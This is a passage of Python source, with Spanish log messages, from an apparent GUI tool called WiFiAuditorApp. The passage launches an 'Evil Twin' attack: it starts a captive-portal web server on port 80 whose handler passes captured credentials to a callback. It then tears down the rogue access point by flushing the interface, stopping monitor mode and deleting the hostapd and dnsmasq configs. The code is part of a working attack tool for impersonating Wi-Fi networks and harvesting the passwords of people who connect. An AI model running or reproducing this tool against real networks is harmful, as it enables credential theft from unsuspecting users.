            self.log_queue.put("[EVIL TWIN] Iniciando portal cautivo en el puerto 80...")
            handler = partial(CaptivePortalHandler, essid=essid, log_callback=self.log_to_main_queue, cred_callback=self.log_to_cred_box)
            self.http_server = socketserver.TCPServer(("", 80), handler)
            self.log_queue.put("[+] ¡Ataque Evil Twin ACTIVO! Esperando conexiones...")
            self.http_server.serve_forever() # Esto bloqueará hasta que se llame a shutdown()

        except subprocess.CalledProcessError as e:
            self.log_queue.put(f"[!] ERROR: Un comando falló durante la configuración: {e.cmd}")
            self.log_queue.put(f"[!] Stderr: {e.stderr}")
        except Exception as e:
            if "Address already in use" in str(e):
                 self.log_queue.put("[!] ERROR: El puerto 80 ya está en uso. Detén otros servicios web (Apache, Nginx).")
            else:
                 self.log_queue.put(f"[!] Error inesperado durante el ataque: {e}")
        finally:
            self.log_queue.put("[*] El servidor del portal cautivo se ha detenido.")
            self.stop_attack()

    def _cleanup_network_interface(self):
        iface = self.interface
        if not iface: return
        self.log_queue.put(f"[*] Limpiando la configuración de la interfaz {iface}...")
        try:
            subprocess.run(["ip", "addr", "flush", "dev", iface], capture_output=True)
            subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
            self.log_queue.put(f"[+] Interfaz {iface} limpiada.")
            stop_monitor_mode(iface, self.log_queue) # Intenta restaurar los servicios de red
        except Exception as e:
            self.log_queue.put(f"[!] Error durante la limpieza de la interfaz: {e}")
        finally:
            # Limpiar archivos de configuración
            for f in ["dnsmasq.conf", "hostapd.conf"]:
                if os.path.exists(f): os.remove(f)

    def on_closing(self):
        if messagebox.askokcancel("Salir", "¿Estás seguro de que quieres salir? Esto detendrá cualquier ataque en curso y restaurará la interfaz."):
            self.stop_attack()
            # Esperar un poco para que la limpieza termine
            if self.attack_thread and self.attack_thread.is_alive():
                self.attack_thread.join(timeout=3)
            self.master.destroy()

if __name__ == "__main__":
    check_root()
    root = tk.Tk()
    app = WiFiAuditorApp(root)
    root.mainloop()
